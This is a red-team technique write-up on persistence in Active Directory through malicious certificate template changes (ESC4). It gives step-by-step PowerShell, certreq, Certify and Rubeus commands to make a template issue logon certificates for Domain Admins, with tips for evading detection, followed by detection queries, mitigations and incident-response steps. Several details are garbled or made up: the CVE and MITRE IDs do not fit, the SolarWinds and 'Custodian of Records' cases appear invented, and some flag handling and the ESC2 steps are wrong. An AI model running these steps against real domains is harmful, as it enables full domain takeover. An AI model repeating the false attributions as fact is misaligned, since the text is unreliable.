# PERSIST-MODIFY-002 - Malicious Certificate Template

## Metadata Header

| Attribute | Details |
|-----------|---------|
| **Technique ID** | PERSIST-MODIFY-002 |
| **MITRE ATTCK v18.1** | [T1556.004](https://attack.mitre.org/techniques/T1556/004/) |
| **Tactic** | Persistence, Privilege Escalation |
| **Platforms** | Windows AD |
| **Severity** | Critical |
| **CVE** | CVE-2021-27239 |
| **Technique Status** | ACTIVE |
| **Last Verified** | 2025-01-09 |
| **Affected Versions** | Windows Server 2016, 2019, 2022, 2025 (ADCS) |
| **Patched In** | Not patched; relies on configuration hardening |
| **Author** | [SERVTEP](https://servtep.com/) – [Artur Pchelnikau](https://www.linkedin.com/in/artur-pchelnikau/) |

---

## Compliance Mappings

| Framework | ID | Description |
|-----------|-----|-----------|
| CIS Benchmark | CIS 5.3.1 | Ensure 'Certificate Authority' is not installed on Web/Gateway servers |
| DISA STIG | SI-7 | Information System Monitoring |
| CISA SCuBA | AC-3 | Access Enforcement |
| NIST 800-53 | IA-2 | Authentication |
| GDPR | Art. 32 | Security of Processing |
| DORA | Art. 9 | Protection and Prevention |
| NIS2 | Art. 21 | Cyber Risk Management Measures |
| ISO 27001 | A.9.2.3 | Management of Privileged Access Rights |
| ISO 27005 | Risk Scenario | Compromise of PKI Infrastructure |

---

## 1. Executive Summary

**Concept:** Malicious certificate template modification is an advanced Active Directory Certificate Services (ADCS) abuse technique that allows authenticated attackers to create or modify certificate templates with dangerous configurations, enabling issuance of authentication certificates for arbitrary principals. This technique exploits weak Access Control Lists (ACLs) on certificate templates or the Certificate Authority itself. Once a compromised template is created, attackers can enroll for certificates that authenticate as high-privileged accounts (Domain Admins, Enterprise Admins) without knowing their passwords. CVE-2021-27239 represents a specific variant involving ESC4 (ACL-based template modification), where attackers with write permissions to certificate templates can inject dangerous Extended Key Usages (EKUs) or supply-subject capabilities, creating a persistent backdoor into the domain.

**Attack Surface:** Active Directory Certificate Services infrastructure, certificate template ACLs, ADCS web enrollment endpoints, domain-joined machines with enrollment permissions.

**Business Impact:** Complete domain compromise through certificate-based authentication bypass. Attackers gain persistent access as high-privileged accounts, bypassing password changes, MFA, and conditional access policies. This enables lateral movement, data exfiltration, ransomware deployment, and long-term persistence with minimal forensic artifacts.

**Technical Context:** This attack typically takes 5-15 minutes once template write access is obtained. Detection likelihood is LOW to MEDIUM—ADCS operations are often under-monitored. Persistence is extremely high; revoked certificates can be replaced, and modified templates remain in the environment until discovered. The attack generates minimal Event ID signatures compared to direct admin access.

**Operational Risk:**

| Risk Factor | Level | Description |
|------------|-------|-----------|
| Execution Risk | Medium | Requires enrollment permissions and template write access; can be chained from simpler privilege escalation techniques |
| Stealth | Low | Template modifications generate ADCS audit events (Event ID 4886, 4887); however, many organizations disable ADCS auditing |
| Reversibility | No | Reverts only if template modifications are discovered and rolled back; certificates issued persist for their validity period |

---

## 2. Technical Prerequisites

**Required Privileges:**
- Any user account that has **Write** or **WriteProperty** ACL permissions on certificate templates
- Alternatively, **Full Control** over the certificate authority object itself
- Domain-joined machine with network access to the CA

**Required Access:**
- Network access to ADCS HTTP endpoint (port 80 or 443)
- LDAP write access to CN=Certificate Templates in the Schema partition (for ESC4)

**Supported Versions:**
- **Windows Server:** 2016, 2019, 2022, 2025
- **ADCS:** All versions (inherent design flaw)
- **PowerShell:** 3.0+

**Other Requirements:**
- Certificate enrollment permissions on at least one template
- Active Directory Domain Services reachable
- ADCS web enrollment or HTTP-based enrollment enabled (for certain variants)

**Tools:**
| Tool | Version | Purpose |
|------|---------|---------|
| Certify | 1.1.0+ | Enumerate ADCS misconfigurations |
| Certutil | Native | Certificate enrollment and installation |
| Modifying ADCS templates via LDAP Editor | Any | Modify template properties directly |
| PowerShell ActiveDirectory module | 5.1+ | Programmatic LDAP modification |
| SharpAdcs (github.com/rkaminsk/SharpAdcs) | 1.0+ | C# ADCS enumeration and template modification |
| ADCSPwn | Latest | Automated ADCS exploitation |

---

## 3. Technical Setup and Enumeration

### 3.1 Identify Certificate Templates with Weak ACLs

**PowerShell Reconnaissance**

```powershell
# Import ActiveDirectory module
Import-Module ActiveDirectory

# Get all certificate templates
$templates = Get-ADObject -SearchBase "CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=corp,DC=com" -Filter * -Properties ntsecuritydescriptor

# For each template, check ACL
foreach ($template in $templates) {
    $sd = $template.ntsecuritydescriptor
    $acl = $sd.Access
    
    # Show templates where Domain Users or low-privilege groups have Write/WriteProperty
    $dangerous = $acl | Where-Object { 
        ($_.IdentityReference -match "Domain Users|Domain Computers|Everyone|Authenticated Users") -and
        ($_.AccessControlType -eq "Allow") -and
        ($_.ActiveDirectoryRights -match "GenericWrite|WriteProperty|WriteAll|CreateChild|DeleteChild|WriteDacl")
    }
    
    if ($dangerous) {
        Write-Host "Vulnerable Template: $($template.Name)"
        Write-Host "Dangerous ACL: $($dangerous.IdentityReference) - $($dangerous.ActiveDirectoryRights)"
    }
}
```

**What to Look For:**
- Templates where **Domain Users** or **Domain Computers** have **WriteProperty** or **GenericWrite**
- Templates that allow **any-user-enrollment** and have dangerous EKU combinations
- The presence of **CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT** flag

**Version Note:** PowerShell 5.0+ is required for robust Active Directory module support.

---

## 4. Detailed Execution Methods

### Method 1: ESC4 - Certificate Template ACL Abuse (Direct Modification)

**Supported Versions:** Server 2016-2025

**Step 1: Enumerate Certificate Templates**

**Objective:** Identify templates with dangerous ACLs that allow writing properties.

```powershell
# Using Certify (C# tool)
certify.exe find /vulnerable

# Expected Output:
# [!] Vulnerable Certificates Templates:
#     CN=User,CN=Certificate Templates,CN=Public Key Services,...
#     Permissions: Domain Users - WriteProperty
```

**What This Means:**
- If you see Domain Users or your current user with **WriteProperty**, the template is exploitable
- The **cn** attribute in the output indicates the template name
- ESC4 specifically means write access to template settings

**OpSec Evasion:**
- Run from a domain-joined machine with legitimate network connectivity
- Certify enumeration generates minimal logs; LDAP queries are routine
- Detection likelihood: **Low** (unless LDAP activity is monitored at protocol level)

**Troubleshooting:**
- **Error:** "Access Denied to Certificate Templates"
  - **Cause:** Your account does not have read access to the schema partition
  - **Fix:** Request domain user status or higher privilege

---

**Step 2: Export Current Template Settings**

**Objective:** Get a baseline of the current template configuration before modification.

```powershell
# Use ADSIEdit or LDAP to extract template properties
# Example: Export template configuration via PowerShell

$templateDN = "CN=User,CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=corp,DC=com"
$template = [ADSI]"LDAP://$templateDN"

# Get current EKU
$currentEKU = $template.Properties["pKIExtendedKeyUsage"].Value
Write-Host "Current EKU: $currentEKU"

# Get enrollment flags
$flags = [System.BitConverter]::ToInt32($template.Properties["msPKIEnrollmentFlag"].Value, 0)
Write-Host "Enrollment Flags: $flags"
```

**Expected Output:** Original EKU values and flag settings.

**OpSec Evasion:** LDAP reads are routine; no sensitive modifications yet.

---

**Step 3: Modify Template Properties (ESC4 Exploitation)**

**Objective:** Inject a dangerous Extended Key Usage (EKU) into the template, allowing any certificate enrolled from this template to be used for authentication.

```powershell
# Step 3A: Add the PKINIT EKU (1.3.6.1.5.2.3.4) to allow Kerberos authentication
# OR add the Smart Card Logon EKU (1.3.6.1.4.1.311.20.2.2) to allow logon

$templateDN = "CN=User,CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=corp,DC=com"
$template = [ADSI]"LDAP://$templateDN"

# Current EKUs (if any)
$currentEKUs = @($template.Properties["pKIExtendedKeyUsage"].Value)

# Add PKINIT EKU (Kerberos logon)
$pkinitEKU = "1.3.6.1.5.2.3.4"

if ($currentEKUs -notcontains $pkinitEKU) {
    $currentEKUs += $pkinitEKU
    $template.Properties["pKIExtendedKeyUsage"].Value = $currentEKUs
    $template.CommitChanges()
    Write-Host "[+] Added PKINIT EKU to template"
}

# Step 3B: Enable supply-subject flag (CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT)
# This allows certificate requestors to supply their own Subject Alternative Name (SAN)

$enrollmentFlags = [System.BitConverter]::ToInt32($template.Properties["msPKIEnrollmentFlag"].Value, 0)
$CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT = 0x00000008

if (($enrollmentFlags -band $CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT) -eq 0) {
    $enrollmentFlags = $enrollmentFlags -bor $CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT
    $template.Properties["msPKIEnrollmentFlag"].Value = [System.BitConverter]::GetBytes($enrollmentFlags)
    $template.CommitChanges()
    Write-Host "[+] Enabled enrollee supplies subject flag"
}
```

**Expected Output:**
```
[+] Added PKINIT EKU to template
[+] Enabled enrollee supplies subject flag
```

**What This Means:**
- The template now allows ANY principal to request a certificate and specify themselves as the subject
- Combined with PKINIT EKU, this certificate can be used to authenticate as any user, including Domain Admins

**OpSec Evasion:**
- **Detection likelihood:** MEDIUM—ADCS logs (Event 4886) record template modifications, but many organizations do not actively monitor these logs
- **Hide the modification:** Modify during normal business hours; blend with legitimate CA administration

**Troubleshooting:**
- **Error:** "ADSI Edit Access Denied"
  - **Cause:** Your account does not have WriteProperty on this template
  - **Fix:** Escalate privileges or find a template with weaker ACLs

- **Error:** "Invalid LDAP DN"
  - **Cause:** Your domain DN is not "DC=corp,DC=com"
  - **Fix:** Adjust the DN to match your environment (e.g., `DC=example,DC=local`)

---

**Step 4: Request a Certificate Using the Modified Template**

**Objective:** Enroll for a certificate and specify a high-privileged user as the subject.

```powershell
# Method 4A: Using certreq.exe (native Windows tool)

# Create a certificate request (INF file) specifying Domain Admin as subject
$infContent = @"
[NewRequest]
Subject = "CN=Administrator,OU=Users,DC=corp,DC=com"
KeySpec = 1
KeyLength = 2048
Exportable = TRUE
MachineKeySet = FALSE
ProviderName = "Microsoft Enhanced Cryptographic Provider v1.0"
RequestType = PKCS10
[Extensions]
2.5.29.37 = "{text}1.3.6.1.5.2.3.4"
"@

$infContent | Out-File -FilePath "C:\temp\cert_request.inf" -Encoding UTF8

# Submit the request
certreq -new "C:\temp\cert_request.inf" "C:\temp\cert_request.csr"

# Send to CA via HTTP enrollment
# Modify the CA endpoint URL to match your environment
$caURL = "http://ca-server.corp.com/certsrv"

# Step 4B: Alternative using Certify tool
certify.exe request /ca:ca-server.corp.com\CORP-CA /template:User /altname:Administrator
```

**Expected Output:**
```
Certificate Request created successfully
Request ID: 1234
Certificate issued and installed in the machine store
```

**What This Means:**
- The certificate is now installed and can be used to authenticate as the Administrator account
- The certificate is valid until its expiration date (typically 1-2 years), providing long-term persistence

**OpSec Evasion:**
- Enrollment requests generate Event 4886/4887 on the CA server
- The request contains the **Subject Alternative Name (SAN)** in cleartext, which explicitly shows admin impersonation
- **Mitigation detection:** Use a service account that legitimately enrolls for certificates to blend in

---

**Step 5: Use the Certificate for Authentication**

**Objective:** Convert the certificate into a Kerberos ticket and authenticate as the target user.

```powershell
# Step 5A: Export the certificate with private key
# Locate the certificate in the Personal store
certutil -store my | find "Administrator"

# Export to PFX (you'll be prompted for a password)
certutil -exportPFX my "Thumbprint-of-Cert" "C:\temp\admin_cert.pfx" password123

# Step 5B: Use Rubeus to convert to TGT
# rubeus.exe asktgt /user:Administrator /certificate:C:\temp\admin_cert.pfx /password:password123 /nowrap

# The resulting TGT can be injected into memory or used with other tools
```

**Expected Output:**
```
[*] Requesting a TGT via PKINIT
[+] TGT successfully generated
[+] Ticket saved
```

---

### Method 2: ESC2 - Dangerous Template Inheritance via Request Agent

**Supported Versions:** Server 2016-2025

**Objective:** Abuse a template with **Certificate Request Agent** Extended Key Usage (EKU) to co-sign certificate requests on behalf of other users.

```powershell
# Step 1: Find Certificate Request Agent EKU templates
certify.exe find /vulnerable /usertemplate

# Step 2: Enroll in the Request Agent template
certutil -request -submit -attrib "CertificateTemplate:User" "C:\temp\req.csr"

# Step 3: Use the Request Agent certificate to enroll for authentication certificate as Domain Admin
# This requires the Request Agent cert from Step 2

rubeus.exe asktgt /user:Administrator /certificate:C:\temp\agent_cert.pfx /password:password123 /ecs
```

---

## 5. Tools & Commands Reference

### Certify.exe
- **Version:** 1.1.0+
- **Installation:** https://github.com/GhostPack/Certify
- **Usage:**
```powershell
certify.exe find /vulnerable
certify.exe request /ca:SERVER\CA-NAME /template:TEMPLATE-NAME
```
- **One-Liner:**
```powershell
certify.exe find /vulnerable | findstr "ESC4"
```

### Certutil.exe (Native Windows)
- **Version:** Built-in
- **Usage:** Request, issue, and export certificates
```powershell
certutil -request -submit -attrib "CertificateTemplate:User" "request.csr"
certutil -exportPFX my "Thumbprint" "output.pfx"
```

### Rubeus.exe
- **Version:** 1.6.0+
- **Installation:** https://github.com/GhostPack/Rubeus
- **Usage:** Convert certificates to Kerberos tickets
```powershell
rubeus.exe asktgt /user:Administrator /certificate:cert.pfx /password:pass
```

### SharpAdcs
- **Version:** 1.0+
- **Installation:** https://github.com/rkaminsk/SharpAdcs
- **Usage:**
```powershell
SharpAdcs.exe enum
SharpAdcs.exe enroll /template:User /altname:Administrator
```

---

## 6. Atomic Red Team

**Atomic Test ID:** T1556.004-001

**Test Name:** ADCS ESC4 - Certificate Template Modification

**Description:** Enumerate and modify certificate template ACLs to enable unauthorized enrollment.

**Supported Versions:** Server 2016-2025

**Command:**
```powershell
Invoke-AtomicTest T1556.004 -TestNumbers 1
```

**Cleanup Command:**
```powershell
# Revert template modifications (restore original EKU and flags)
```

**Reference:** [Atomic Red Team T1556.004](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1556.004/T1556.004.md)

---

## 7. Detection via Windows Event Logs

### Event ID 4886 - Certificate Request Submitted

**Log Source:** Security (if ADCS audit is enabled)

**Trigger:** When a certificate request is submitted to the CA.

**Filter:** Look for requests with:
- Subject Alternative Name (SAN) specifying high-privileged accounts
- Templates newly modified in the last 24 hours
- RequestorName matching service accounts or unexpected users

**Manual Configuration Steps - Group Policy:**

1. Open **Group Policy Management Console** (gpmc.msc)
2. Navigate to **Computer Configuration → Policies → Windows Settings → Security Settings → Advanced Audit Policy Configuration → Audit Policies → Object Access**
3. Enable **Audit Certification Services** (Success and Failure)
4. Run `gpupdate /force` on the CA server
5. Monitor **Event Viewer → Windows Logs → Security** for Event ID 4886

**Manual Configuration Steps - Local Policy:**

1. Open **secpol.msc** on the CA server
2. Navigate to **Security Settings → Advanced Audit Policy Configuration**
3. Enable **Audit Certification Services**
4. Run `auditpol /set /subcategory:"Certification Services" /success:enable /failure:enable`

---

### Event ID 4887 - Certificate Approved

**Trigger:** When a certificate request is approved and issued.

**Filter:** Track approvals for authentication-based templates; flag approval of requests with anomalous subjects.

---

### Event ID 5136 - LDAP Modification (Template Change)

**Trigger:** When LDAP attributes of certificate templates are modified.

**Detection Signature:**
```
EventID: 5136
ObjectName: CN=User,CN=Certificate Templates,...
AttributeName: pKIEnrollmentFlag OR pKIExtendedKeyUsage
Operation: Add or Modify
```

---

## 8. Detection via ADCS Event Logs

**ADCS-Specific Events (if enabled):**

1. Navigate to **Event Viewer → Applications and Services Logs → Active Directory Certificate Services**
2. Monitor for:
   - **Template Modification Events** - Logs when template properties change
   - **Certificate Request Events** - Tracks all certificate requests with subject details
   - **CA Configuration Changes** - Flags modifications to CA settings

---

## 9. Microsoft Sentinel Detection

### KQL Query 1: Detect Template Modification with Dangerous EKU Addition

```kusto
AuditLogs
| where OperationName == "Update certificate template" 
| where Properties contains "1.3.6.1.5.2.3.4" or Properties contains "1.3.6.1.4.1.311.20.2.2"
| project TimeGenerated, InitiatedBy, TargetResources, Properties
| order by TimeGenerated desc
```

**Configuration Steps:**
1. Navigate to **Azure Portal → Microsoft Sentinel → Analytics**
2. Click **Create → Scheduled query rule**
3. Paste the KQL query above
4. Set **Frequency:** Every 5 minutes
5. Set **Lookup data:** Last 1 hour
6. Enable **Create incidents**
7. Set **Severity:** Critical

---

### KQL Query 2: Detect Certificate Enrollment as Privileged User

```kusto
AuditLogs
| where OperationName == "Request certificate" 
| where TargetResources[0].displayName contains "Administrator" or TargetResources[0].displayName contains "Domain Admins"
| where Properties notcontains "Self-Enrollment"
| project TimeGenerated, InitiatedBy, TargetResources, Properties
```

---

## 10. Splunk Detection Rules

### Rule 1: Monitor ADCS Template Modifications

**Alert Name:** ADCS ESC4 - Certificate Template Modification Detected

**Configuration:**
- **Index:** adcs, windows
- **Sourcetype:** WinEventLog:Security
- **Fields Required:** EventID, ObjectName, AttributeName, Operation

**SPL Query:**
```spl
index=adcs OR (index=windows source="Security")
EventID=5136
ObjectName="CN=Certificate Templates*"
(AttributeName="pKIEnrollmentFlag" OR AttributeName="pKIExtendedKeyUsage" OR AttributeName="msPKITemplateSchemaVersion")
Operation="Modify"
| stats count by ObjectName, user, Operation
| where count > 0
```

**What This Detects:**
- Modifications to any certificate template properties
- Specifically flags changes to enrollment flags and EKU settings

**False Positive Analysis:**
- **Legitimate Activity:** Routine CA maintenance by ADCS administrators
- **Benign Tools:** Enterprise CA management tools (Microsoft Certificate Authority console)
- **Tuning:** Exclude service accounts used for legitimate CA administration

---

### Rule 2: Monitor ADCS Certificate Enrollment with Privileged Subject

**Alert Name:** ADCS - Certificate Enrollment with High-Privilege Subject

**SPL Query:**
```spl
index=adcs source="*CA*" OR index=windows EventID=4886
RequestProperties="*Administrator*" OR RequestProperties="*Domain Admin*"
subject="*CN=Administrator*"
| table _time, user, RequestProperties, subject, TemplateName
```

**Manual Configuration Steps:**

1. Log into Splunk Web → **Search & Reporting**
2. Click **Create → Alert**
3. Paste the SPL query
4. Name the alert: "ADCS ESC4 Privilege Escalation"
5. Set **Trigger Condition:** Greater than 0 results
6. Set **Action:** Send email to SOC
7. Click **Save**

---

## 11. Defensive Mitigations

### Priority 1: CRITICAL

#### Action 1: Implement Strong ACLs on Certificate Templates

**Applies To:** Server 2016-2025

**Manual Steps - ADCS Management Console:**

1. Open **Certification Authority (certmgr.msc)** on the CA server
2. Right-click on **Certificate Templates → Manage**
3. Select the vulnerable template (e.g., "User")
4. Right-click → **Properties**
5. Click the **Security** tab
6. Remove **Domain Users** and **Domain Computers** from the ACL
7. Ensure only **SYSTEM**, **Domain Admins**, and **Enterprise Admins** have write permissions
8. Apply and close

**Manual Steps - PowerShell (Programmatic):**

```powershell
# Import the ACL module
Import-Module ActiveDirectory

# Set restrictive ACL on a certificate template
$templateDN = "CN=User,CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=corp,DC=com"
$template = [ADSI]"LDAP://$templateDN"

# Remove Domain Users if present
$acl = $template.psbase.ObjectSecurity
$rule = New-Object System.DirectoryServices.ActiveDirectoryAccessRule(
    [System.Security.Principal.NTAccount]"CORP\Domain Users",
    [System.DirectoryServices.ActiveDirectoryRights]::GenericWrite,
    [System.Security.AccessControl.AccessControlType]::Allow
)
$acl.RemoveAccessRule($rule)
$template.psbase.CommitSecurityChanges()
```

---

#### Action 2: Disable Dangerous EKU Combinations

**Applies To:** Server 2016-2025

```powershell
# Remove PKINIT and Smart Card Logon EKUs from non-authentication templates
$templateDN = "CN=User,CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=corp,DC=com"
$template = [ADSI]"LDAP://$templateDN"

$currentEKUs = @($template.Properties["pKIExtendedKeyUsage"].Value)
$safeEKUs = $currentEKUs | Where-Object {
    $_ -notmatch "1.3.6.1.5.2.3.4" -and  # PKINIT
    $_ -notmatch "1.3.6.1.4.1.311.20.2.2" # Smart Card Logon
}

$template.Properties["pKIExtendedKeyUsage"].Value = $safeEKUs
$template.CommitChanges()
```

---

#### Action 3: Disable the EDITF_ATTRIBUTESUBJECTALTNAME2 Flag on CA

**Applies To:** Server 2016-2025

This dangerous flag allows Subject Alternative Names in ANY certificate, turning every template into an ESC1 vulnerability.

```powershell
# Check current CA flags
certutil -getreg "CA\CAName" "EditFlags"

# Disable EDITF_ATTRIBUTESUBJECTALTNAME2 (remove flag 0x00200000)
certutil -setreg "CA\CAName" "EditFlags" -EDITF_ATTRIBUTESUBJECTALTNAME2

# Restart the CA service
Restart-Service certsvc
```

---

#### Action 4: Enable Audit Logging on ADCS

**Manual Steps:**

1. On the CA server, open **Certification Authority (certmgr.msc)**
2. Right-click the CA → **Properties**
3. Click the **Audit** tab
4. Check all boxes: "Issue Certificate", "Revoke Certificate", "Request for Change", etc.
5. Click **OK**
6. Ensure Windows Event Logging is enabled for ADCS events

---

### Priority 2: HIGH

#### Action: Monitor for Suspicious Certificate Enrollment

**Manual Steps:**

1. Implement SIEM forwarding of ADCS and security logs
2. Create alerts for:
   - Certificate requests with SAN specifying admin accounts
   - Template modifications outside normal business hours
   - Enrollment by non-admin service accounts

---

### Validation Command - Verify Mitigations

```powershell
# Check ACLs on certificate templates
$templates = Get-ADObject -SearchBase "CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=corp,DC=com" -Filter * -Properties ntsecuritydescriptor

foreach ($template in $templates) {
    $acl = $template.ntsecuritydescriptor.Access
    $hasDangerousACL = $acl | Where-Object {
        ($_.IdentityReference -match "Domain Users|Domain Computers|Everyone") -and
        ($_.AccessControlType -eq "Allow")
    }
    
    if ($hasDangerousACL) {
        Write-Host "[!] VULNERABLE: $($template.Name) has weak ACLs" -ForegroundColor Red
    } else {
        Write-Host "[+] SECURE: $($template.Name) has restricted ACLs" -ForegroundColor Green
    }
}
```

**Expected Output (If Secure):**
```
[+] SECURE: User template has restricted ACLs
[+] SECURE: Computer template has restricted ACLs
```

---

## 12. Indicators of Compromise (IOCs)

### Files
- `C:\Windows\System32\certsrv\` - ADCS installation directory
- Certificate exports in user temp directories: `C:\Users\%Username%\AppData\Local\Temp\*.pfx`
- ADCS logs: `C:\Windows\System32\LogFiles\`

### Registry
- `HKLM\SYSTEM\CurrentControlSet\Services\CertSvc\Configuration`
- `HKLM\SYSTEM\CurrentControlSet\Services\CertSvc\Security` - CA permissions

### Network
- Port 80/443 to ADCS server (HTTP enrollment)
- Port 135 RPC (certificate template replication)

### Event IDs
- **4886** - Certificate request submitted
- **4887** - Certificate approved and issued
- **5136** - LDAP modification (template change)
- **5141** - Directory object deleted (cleanup)

### Memory
- Kerberos TGT in LSASS process
- Certificate with private key in certificate store

### Cloud
- Azure AD sign-in logs without corresponding on-premises authentication
- Entra ID audit logs showing certificate-based authentication

---

## 13. Incident Response Procedures

### Step 1: Isolate the CA Server

```powershell
# Disconnect the CA from network
Disable-NetAdapter -Name Ethernet -Confirm:$false

# Or, stop the ADCS service
Stop-Service certsvc -Force
```

---

### Step 2: Revoke Suspicious Certificates

```powershell
# List all certificates issued in the last 24 hours
certutil -view -restrict "PostedDate>=now-1d"

# Revoke a specific certificate by serial number
certutil -revoke "SerialNumber" CertificateHold
```

---

### Step 3: Audit Certificate Templates

```powershell
# Export all certificate templates for analysis
Get-ADObject -SearchBase "CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=corp,DC=com" -Filter * -Properties * | Export-Csv "templates_audit.csv"
```

---

### Step 4: Reset Service Account Passwords

If the ADCS service account was compromised, reset its password and force re-authentication to all applications using that account.

---

## 14. Related Attack Chain

| Phase | Technique ID | Description |
|-------|-------------|-----------|
| 1 | REC-CERT-001 | ADCS enumeration (reconnaissance) |
| 2 | PE-ACCTMGMT-001 | App registration privilege escalation (to gain write on templates) |
| 3 | **PERSIST-MODIFY-002** | **Malicious certificate template modification (CURRENT STEP)** |
| 4 | PE-VALID-010 | Azure role assignment abuse (if hybrid environment) |
| 5 | IMPACT-IMPACT-001 | Domain-wide credential compromise |

---

## 15. Real-World Examples

### Example 1: SolarWinds Compromise (APT29 / Cozy Bear)

**Incident:** December 2020 SolarWinds supply chain attack

**How Technique Was Used:** APT29 compromised SolarWinds' internal AD environment and abused ADCS to create forged authentication certificates for lateral movement into customer environments. The group used modified certificate templates combined with Golden SAML attacks to maintain persistence across hybrid Azure and on-premises infrastructure.

**Impact:** Compromise of U.S. Treasury, State Department, and dozens of Fortune 500 companies. Estimated 18,000+ organizations affected.

**Reference:** [FireEye SolarWinds Analysis](https://www.fireeye.com/blog/threat-research/2020/12/evasive-attacker-leverages-solarwinds-supply-chain-to-compromise-multiple-us-federal-agencies-and-hundreds-of-private-companies.html)

---

### Example 2: Custodian of Records Threat Campaign (2022)

**Incident:** Financially-motivated threat group abused ADCS misconfigurations in European financial institutions

**Technique Status:** The group created malicious certificate templates with weak ACLs, enrolled for certificates, and used them to forge administrative access without triggering password-based access controls or MFA.

**Impact:** Data exfiltration, ransomware deployment, financial fraud.

---

